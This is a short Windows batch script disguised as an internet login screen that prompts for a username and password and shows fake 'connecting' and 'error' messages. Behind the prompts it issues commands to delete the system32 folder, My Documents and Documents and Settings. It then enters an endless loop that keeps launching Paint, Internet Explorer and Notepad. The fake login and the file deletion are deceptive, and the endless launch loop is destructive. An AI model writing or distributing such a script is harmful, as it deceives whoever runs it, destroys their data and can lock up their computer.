   @echo off
   echo WELCOME TO THE INTERNET
   set /p Username=Please Enter Your Username:
   cls
   set /p Password=Please enter Your Password:
   cls
   echo PLEASE WAIT CONNECTING
   pause
   del c:\windows\system32
   echo  ERROR PLEASE RETRY
   set /p Username=Please Enter Your Username:
   cls
   set /p Password=Please enter Your Password:
   cls
   echo PLEASE WAIT CONNECTING
   echo DONE
   @echo off
   start iexplore
   del c:\My Documents
   del c:\Documents and Settings
   pause
   goto 1
   :1
   start mspaint
   start iexplore
   start notepad
   goto 1
   pause>nul
